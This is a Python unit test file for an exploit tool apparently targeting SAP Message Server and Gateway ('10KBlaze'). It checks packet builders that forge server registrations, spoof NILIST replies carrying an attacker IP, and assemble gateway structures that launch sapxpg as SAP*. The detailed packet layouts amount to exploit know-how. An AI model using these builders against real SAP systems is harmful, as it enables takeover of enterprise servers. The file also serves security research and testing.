"""Extended tests for 10KBlaze exploit — covers functions added for kernel 742
compatibility and the GWMON reply mechanism.

Tests:
  - pkt_change_ip: MS_CHANGE_IP packet structure
  - pkt_set_logon: MS_SET_LOGON packet structure (DIAG/RFC)
  - build_nilist_port_reply: AD_GET_NILIST_PORT reply (kernel 745+)
  - build_gwmon_nilist_reply: GWMON reply with DP info routing (kernel 742)
  - _old_nilist_body: kernel 720/742 NILIST IP body format
  - ni_send / ni_recv: NI framing helpers
  - build_saprfcextend / build_saprf_dt_struct: GW P2 sub-structures
"""

import sys
import os
import socket
import struct
from unittest.mock import MagicMock, patch, call

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from sap_ms_betrusted import (
    _HEADER_LEN, _ADM_EYE, _ADM_HDR_LEN, _ADM_REC_SIZE,
    FLAG_REQUEST, FLAG_REPLY, FLAG_ONE_WAY, FLAG_ADMIN,
    IFLAG_SEND_NAME,
    MSG_DIA,
    MS_OPCODE_CHANGE_IP, MS_OPCODE_SET_LOGON,
    ADM_SELFIDENT, ADM_NILIST, ADM_GET_NILIST_PORT,
    pkt_change_ip, pkt_set_logon,
    build_nilist_port_reply, build_gwmon_nilist_reply,
    _old_nilist_body, _nilist_ip_body,
    ms_build_header, ms_parse_header,
    ni_send, ni_recv,
)
from sap_gw_xpg_standalone import (
    build_saprfcextend, build_saprf_dt_struct, build_saprfc_header_v6,
    pad_right, pad_right_null,
)


# ---------------------------------------------------------------------------
# pkt_change_ip
# ---------------------------------------------------------------------------

class TestPktChangeIp:

    def test_starts_with_ms_header(self):
        pkt = pkt_change_ip("server", b"\x00" * 8, "10.0.0.1")
        assert pkt[:12] == b"**MESSAGE**\x00"

    def test_flag_is_request(self):
        pkt = pkt_change_ip("server", b"\x00" * 8, "10.0.0.1")
        assert pkt[66] == FLAG_REQUEST

    def test_opcode_is_change_ip(self):
        pkt = pkt_change_ip("server", b"\x00" * 8, "10.0.0.1")
        assert pkt[_HEADER_LEN] == MS_OPCODE_CHANGE_IP

    def test_opcode_version_is_2(self):
        pkt = pkt_change_ip("server", b"\x00" * 8, "10.0.0.1")
        assert pkt[_HEADER_LEN + 1] == 2

    def test_ipv4_embedded(self):
        ip = "192.168.2.210"
        pkt = pkt_change_ip("server", b"\x00" * 8, ip)
        ipv4 = socket.inet_aton(ip)
        assert pkt[_HEADER_LEN + 4: _HEADER_LEN + 8] == ipv4

    def test_ipv6_is_mapped_ipv4(self):
        ip = "10.20.30.40"
        pkt = pkt_change_ip("server", b"\x00" * 8, ip)
        ipv4 = socket.inet_aton(ip)
        expected_v6 = b"\x00" * 10 + b"\xff\xff" + ipv4
        assert pkt[_HEADER_LEN + 8: _HEADER_LEN + 24] == expected_v6

    def test_total_size(self):
        pkt = pkt_change_ip("server", b"\x00" * 8, "1.2.3.4")
        assert len(pkt) == _HEADER_LEN + 4 + 4 + 16  # header + opcode + ipv4 + ipv6

    def test_toname_default_msg_server(self):
        pkt = pkt_change_ip("server", b"\x00" * 8, "1.2.3.4")
        toname = pkt[14:54].rstrip(b" \x00").decode("ascii")
        assert toname == "MSG_SERVER"

    def test_fromname_in_packet(self):
        pkt = pkt_change_ip("my_fake_server", b"\x00" * 8, "1.2.3.4")
        assert b"my_fake_server" in pkt[68:108]


# ---------------------------------------------------------------------------
# pkt_set_logon
# ---------------------------------------------------------------------------

class TestPktSetLogon:

    def test_starts_with_ms_header(self):
        pkt = pkt_set_logon("server", b"\x00" * 8, "10.0.0.1", 3200)
        assert pkt[:12] == b"**MESSAGE**\x00"

    def test_opcode_is_set_logon(self):
        pkt = pkt_set_logon("server", b"\x00" * 8, "10.0.0.1", 3200)
        assert pkt[_HEADER_LEN] == MS_OPCODE_SET_LOGON

    def test_diag_logon_type(self):
        pkt = pkt_set_logon("server", b"\x00" * 8, "10.0.0.1", 3200, logon_type=2)
        logon_type = struct.unpack("!H", pkt[_HEADER_LEN + 4: _HEADER_LEN + 6])[0]
        assert logon_type == 2

    def test_rfc_logon_type(self):
        pkt = pkt_set_logon("server", b"\x00" * 8, "10.0.0.1", 3300, logon_type=6)
        logon_type = struct.unpack("!H", pkt[_HEADER_LEN + 4: _HEADER_LEN + 6])[0]
        assert logon_type == 6

    def test_port_encoded(self):
        pkt = pkt_set_logon("server", b"\x00" * 8, "10.0.0.1", 3200)
        port = struct.unpack("!H", pkt[_HEADER_LEN + 6: _HEADER_LEN + 8])[0]
        assert port == 3200

    def test_ip_embedded(self):
        ip = "192.168.2.210"
        pkt = pkt_set_logon("server", b"\x00" * 8, ip, 3200)
        assert socket.inet_aton(ip) in pkt

    def test_host_included_when_provided(self):
        pkt = pkt_set_logon("server", b"\x00" * 8, "10.0.0.1", 3200, host="myhost.tld")
        assert b"myhost.tld" in pkt

    def test_no_host_when_empty(self):
        pkt = pkt_set_logon("server", b"\x00" * 8, "10.0.0.1", 3200, host="")
        # host_length should be 0
        host_len_offset = _HEADER_LEN + 4 + 2 + 2 + 4 + 2 + 2  # opcode + type + port + ip + logonname + prot
        host_len = struct.unpack("!H", pkt[host_len_offset:host_len_offset + 2])[0]
        assert host_len == 0

    def test_address6_sentinel(self):
        pkt = pkt_set_logon("server", b"\x00" * 8, "10.0.0.1", 3200)
        assert pkt[-2:] == b"\xff\xff"


# ---------------------------------------------------------------------------
# build_nilist_port_reply
# ---------------------------------------------------------------------------

class TestBuildNilistPortReply:

    def test_starts_with_ms_header(self):
        pkt = build_nilist_port_reply("server", b"\x00" * 8,
                                       toname="target", attacker_ip="10.0.0.1")
        assert pkt[:12] == b"**MESSAGE**\x00"

    def test_flag_is_one_way(self):
        pkt = build_nilist_port_reply("server", b"\x00" * 8,
                                       toname="target", attacker_ip="10.0.0.1")
        assert pkt[66] == FLAG_ONE_WAY

    def test_toname_set_correctly(self):
        pkt = build_nilist_port_reply("server", b"\x00" * 8,
                                       toname="s4hanadev_S4H_00",
                                       attacker_ip="10.0.0.1")
        toname = pkt[14:54].rstrip(b" \x00").decode("ascii")
        assert toname == "s4hanadev_S4H_00"

    def test_attacker_ip_in_packet(self):
        ip = "192.168.2.210"
        pkt = build_nilist_port_reply("server", b"\x00" * 8,
                                       toname="target", attacker_ip=ip)
        assert socket.inet_aton(ip) in pkt

    def test_adm_eyecatcher_present(self):
        pkt = build_nilist_port_reply("server", b"\x00" * 8,
                                       toname="target", attacker_ip="10.0.0.1")
        assert _ADM_EYE in pkt


# ---------------------------------------------------------------------------
# _old_nilist_body (kernel 720/742 RSMONGWY format)
# ---------------------------------------------------------------------------

class TestOldNilistBody:

    def test_size_fits_adm_record(self):
        body = _old_nilist_body("192.168.2.210")
        assert len(body) <= 101

    def test_contains_ip(self):
        ip = "10.20.30.40"
        body = _old_nilist_body(ip)
        assert socket.inet_aton(ip) in body

    def test_contains_subnet_mask(self):
        body = _old_nilist_body("1.2.3.4")
        mask = socket.inet_aton("0.0.255.255")
        assert mask in body

    def test_starts_with_zero_padding(self):
        body = _old_nilist_body("1.2.3.4")
        assert body[:4] == b"\x00" * 4

    def test_has_utf16be_padding(self):
        body = _old_nilist_body("1.2.3.4")
        # After mask(4) + ip(4) + 8 zero bytes = 16 bytes, rest is UTF-16-BE spaces
        # The UTF-16-BE encoding of ' ' is b'\x00\x20'
        assert b"\x00 " in body or b" \x00" in body


# ---------------------------------------------------------------------------
# _nilist_ip_body — more detailed tests
# ---------------------------------------------------------------------------

class TestNilistIpBodyDetailed:

    def test_count_field_is_1(self):
        body = _nilist_ip_body("1.2.3.4")
        count = struct.unpack("!I", body[:4])[0]
        assert count == 1

    def test_flags_field(self):
        body = _nilist_ip_body("1.2.3.4")
        # flags at offset 24 should be 0x0CE5
        assert b"\x0c\xe5" in body

    def test_hostname_derived_from_ip(self):
        body = _nilist_ip_body("192.168.2.210")
        # Hostname is IP with dots→hyphens
        assert b"192-168-2-210" in body


# ---------------------------------------------------------------------------
# build_gwmon_nilist_reply (kernel 742 DP routing)
# ---------------------------------------------------------------------------

class TestBuildGwmonNilistReply:

    @staticmethod
    def _build_fake_request(our_name="fake_srv", requestor="REAL_SRV_S4H_00"):
        """Build a minimal fake GWMON request packet for testing."""
        hdr = ms_build_header(
            toname=our_name, fromname=requestor,
            msgtype=MSG_DIA, flag=FLAG_REQUEST, iflag=IFLAG_SEND_NAME,
            key=b"\x01\x02\x03\x04\x05\x06\x07\x08",
        )
        # 5-byte opcode prefix + 507-byte fake DP info
        opcode_prefix = struct.pack("BBBBB", 0, 0, 0, 0, 13)  # dp_version=13
        dp_info = bytearray(507)
        dp_info[6:46] = requestor.encode("ascii").ljust(40, b" ")[:40]
        dp_info[48:50] = struct.pack("!H", 5)   # worker_from_num
        dp_info[50] = 1                           # addr_from_t
        dp_info[51:53] = struct.pack("!H", 42)  # addr_from_u
        dp_info[53] = 0                           # addr_from_m
        dp_info[54:58] = struct.pack("!I", 999) # respid_from
        dp_info[59:99] = our_name.encode("ascii").ljust(40, b" ")[:40]
        dp_info[101:103] = struct.pack("!H", 7) # worker_to_num
        dp_blob = opcode_prefix + bytes(dp_info)
        # ADM with opcode 0x3c
        adm = _ADM_EYE + b"\x01\x01"
        adm += ("%11d" % 104).encode("ascii")
        adm += ("%11d" % 1).encode("ascii")
        rec_body = b"\x00" * 101
        rec = bytes([ADM_GET_NILIST_PORT, 0, 0]) + rec_body
        adm += rec
        return hdr + dp_blob + adm

    def test_returns_bytes(self):
        req = self._build_fake_request()
        reply = build_gwmon_nilist_reply(req, "fake_srv", "10.0.0.1")
        assert isinstance(reply, bytes)
        assert len(reply) > 0

    def test_flag_is_reply(self):
        req = self._build_fake_request()
        reply = build_gwmon_nilist_reply(req, "fake_srv", "10.0.0.1")
        assert reply[66] == FLAG_REPLY

    def test_toname_is_requestor(self):
        req = self._build_fake_request(requestor="WINWAS740_W74_40")
        reply = build_gwmon_nilist_reply(req, "fake_srv", "10.0.0.1")
        toname = reply[14:54].rstrip(b" \x00").decode("ascii")
        assert toname == "WINWAS740_W74_40"

    def test_fromname_is_ours(self):
        req = self._build_fake_request()
        reply = build_gwmon_nilist_reply(req, "my_server", "10.0.0.1")
        fromname = reply[68:108].rstrip(b" \x00").decode("ascii")
        assert fromname == "my_server"

    def test_attacker_ip_in_reply(self):
        ip = "192.168.2.210"
        req = self._build_fake_request()
        reply = build_gwmon_nilist_reply(req, "fake_srv", ip)
        assert socket.inet_aton(ip) in reply

    def test_loopback_ips_in_reply(self):
        req = self._build_fake_request()
        reply = build_gwmon_nilist_reply(req, "fake_srv", "10.0.0.1")
        assert socket.inet_aton("127.0.0.1") in reply
        assert socket.inet_aton("127.0.0.2") in reply

    def test_adm_eyecatcher_in_reply(self):
        req = self._build_fake_request()
        reply = build_gwmon_nilist_reply(req, "fake_srv", "10.0.0.1")
        assert _ADM_EYE in reply

    def test_dp_info_preserved(self):
        req = self._build_fake_request()
        reply = build_gwmon_nilist_reply(req, "fake_srv", "10.0.0.1")
        # Reply should be larger than just header + ADM (it includes DP info)
        adm_pos = reply.find(_ADM_EYE)
        assert adm_pos > _HEADER_LEN + 100  # DP info is > 100 bytes

    def test_dp_fromname_swapped_to_ours(self):
        req = self._build_fake_request(our_name="fake_srv", requestor="REAL_SRV")
        reply = build_gwmon_nilist_reply(req, "my_new_name", "10.0.0.1")
        # DP fromname at offset HEADER + 5 (opcode prefix) + 6 in DP info
        dp_start = _HEADER_LEN + 5 + 6
        dp_fromname = reply[dp_start:dp_start + 40].rstrip(b" ").decode("ascii")
        assert dp_fromname == "my_new_name"

    def test_rsmongwy_detection_uses_old_format(self):
        req = self._build_fake_request()
        # Inject RSMONGWY string into the packet
        req_with_old = req.replace(b"\x00" * 20, b"RSMONGWY_SEND_NILIST", 1)
        reply = build_gwmon_nilist_reply(req_with_old, "srv", "10.0.0.1",
                                          kernel_new=False)
        # Should contain ADM_NILIST (0x07) records, not ADM_GET_NILIST_PORT (0x3c)
        adm_pos = reply.find(_ADM_EYE)
        if adm_pos >= 0:
            # Skip past the ADM header to check record opcodes
            rec_area = reply[adm_pos + 36:]  # extended header is 36 bytes
            # First record is SELFIDENT, second should be NILIST (0x07)
            if len(rec_area) >= 208:  # 2 records × 104 bytes
                second_opcode = rec_area[104]  # first byte of second record
                assert second_opcode == ADM_NILIST

    def test_empty_packet_returns_empty(self):
        reply = build_gwmon_nilist_reply(b"", "srv", "10.0.0.1")
        assert reply == b""


# ---------------------------------------------------------------------------
# ni_send / ni_recv (NI framing)
# ---------------------------------------------------------------------------

class TestNiSend:

    def test_sends_4byte_length_prefix(self):
        mock_sock = MagicMock()
        ni_send(mock_sock, b"HELLO")
        sent_data = mock_sock.sendall.call_args[0][0]
        length_prefix = struct.unpack("!I", sent_data[:4])[0]
        assert length_prefix == 5
        assert sent_data[4:] == b"HELLO"

    def test_empty_payload(self):
        mock_sock = MagicMock()
        ni_send(mock_sock, b"")
        sent_data = mock_sock.sendall.call_args[0][0]
        assert sent_data == struct.pack("!I", 0)


class TestNiRecv:

    def test_reads_length_then_payload(self):
        mock_sock = MagicMock()
        payload = b"SAP_RESPONSE_DATA"
        ni_frame = struct.pack("!I", len(payload)) + payload
        mock_sock.recv.side_effect = [ni_frame[:4], payload]
        result = ni_recv(mock_sock, 5.0)
        assert result == payload

    def test_sets_timeout(self):
        mock_sock = MagicMock()
        mock_sock.recv.side_effect = [struct.pack("!I", 3), b"abc"]
        ni_recv(mock_sock, 7.5)
        mock_sock.settimeout.assert_called_with(7.5)


# ---------------------------------------------------------------------------
# build_saprfcextend (GW P2 sub-structure)
# ---------------------------------------------------------------------------

class TestBuildSaprfcextend:

    def test_size_is_32_bytes(self):
        ext = build_saprfcextend("T_75", "192-168", "sapxpg")
        assert len(ext) == 32

    def test_dest_name_space_padded(self):
        ext = build_saprfcextend("T_75", "lu", "tp")
        assert ext[:8] == b"T_75    "

    def test_ncpic_lu_null_padded(self):
        ext = build_saprfcextend("T_75", "192-168", "sapxpg")
        lu = ext[8:16]
        assert lu[:7] == b"192-168"
        assert lu[7] == 0  # null terminator

    def test_ncpic_tp_space_padded(self):
        ext = build_saprfcextend("T_75", "lu", "sapxpg")
        tp = ext[16:24]
        assert tp[:6] == b"sapxpg"
        assert tp[6:] == b"  "

    def test_ctype_default_started_prg(self):
        ext = build_saprfcextend("T_75", "lu", "tp")
        assert ext[24] == 0x45  # STARTED_PRG


# ---------------------------------------------------------------------------
# build_saprf_dt_struct (GW P2 SAPRFCDTStruct)
# ---------------------------------------------------------------------------

class TestBuildSaprfDtStruct:

    def test_size_is_340_bytes(self):
        dt = build_saprf_dt_struct("10.0.0.1")
        assert len(dt) == 340

    def test_target_hostname_in_long_lu(self):
        dt = build_saprf_dt_struct("10.0.0.1", target_hostname="s4hanadev")
        assert b"s4hanadev" in dt

    def test_ip_fallback_uses_hyphens(self):
        dt = build_saprf_dt_struct("10.0.0.1")
        assert b"10-0-0-1" in dt

    def test_version_byte(self):
        dt = build_saprf_dt_struct("10.0.0.1")
        assert dt[0] == 0x60  # version = 96

    def test_target_ip_in_struct(self):
        dt = build_saprf_dt_struct("192.168.2.209", target_hostname="s4hanadev")
        assert socket.inet_aton("192.168.2.209") in dt

    def test_user_field_contains_sap_star(self):
        dt = build_saprf_dt_struct("10.0.0.1")
        assert b"SAP*" in dt
